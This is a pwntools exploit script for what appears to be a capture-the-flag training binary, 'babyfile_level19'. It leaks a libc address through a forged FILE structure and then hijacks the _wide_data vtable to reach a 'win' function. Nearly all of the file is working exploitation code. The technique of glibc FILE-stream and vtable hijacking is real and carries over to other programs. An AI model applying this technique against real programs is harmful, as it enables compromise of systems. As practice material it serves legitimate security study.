#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder
# In this level, run this payload several time to get the flag
_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level19_patched"
else:
    binary = "/challenge/babyfile_level19"
    
context.log_level = 'info'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
b *main
b *challenge
c
decompiler connect ida --host 172.19.176.1 --port 3662
b *_IO_wdoallocbuf
si
c
c
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

io = start()
info(f"fp @{hex(elf.sym['fp'])}")
# io.timeout = 0.2
sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "w") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
__GI__IO_file_jumps = fp + 0xd8
payload = fs.write(__GI__IO_file_jumps, 20) 
success(f"Address contains __GI__IO_file_jumps: {hex(__GI__IO_file_jumps)}")
sla(b'> ', b'new_note') # 0
sla(b'Which note? (0-10)\n> ', b'0')
sla(b'How many bytes to the note?\n> ', str(len(payload)).encode())
rcu(b'notes[0] = ')
note = int(rcu(b';')[:-1], 16)
success(f"note @ {hex(note)}")

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'write_file')
sla(b'Which note? (0-10)\n> ', b'0')
rcu(b'fwrite(notes[0], 1, 115, fp);\n')
__GI__IO_file_jumps = u64(io.recvn(6) + b'\x00\x00')
if user == 'broder':
    libc.address = __GI__IO_file_jumps - libc.sym['__GI__IO_file_jumps']
else: 
    libc.address = __GI__IO_file_jumps - 0x1e94a0
success(f"libc @ {hex(libc.address)}")

sla(b'> ', b'new_note') # 0
sla(b'Which note? (0-10)\n> ', b'0')
sla(b'How many bytes to the note?\n> ', str(0x3e8).encode())
rcu(b'notes[0] = ')
note = int(rcu(b';')[:-1], 16)
success(f"note @ {hex(note)}")

win = elf.sym['win']
success(f"win @ {hex(win)}")
if user == 'broder':
    fake_vtable = libc.sym['_IO_wfile_jumps_maybe_mmap'] + 160
else:
    fake_vtable = libc.address + 0x1e8de0
    
success(f"fake_vtable @ {hex(fake_vtable)}")
_wide_data = fp - 224
_wide_data += 16
fs = b'password' # password
fs += b'\x00' * 8
fs += p(fp + 24 - 0x68)     # _wide_data.vtable
fs += p(win)
fs += p(0) * (1 + 12 - len(fs) // 8)
fs += p(libc.sym['_IO_2_1_stderr_'])
fs += p32(3) + p8(0) * 20
fs += p(libc.address + 0x1ec000)           # lock
fs += p(0xffffffffffffffff)
fs += p(0)
fs += p(_wide_data)
fs += p(0) * 4
fs += p8(0) * 16
fs += p(fake_vtable)

print(len(fs))

sla(b'> ', b'write_fp')
s(fs)
sla(b'> ', b'write_file')
stop()
sla(b'Which note? (0-10)\n> ', b'0')
io.interactive()
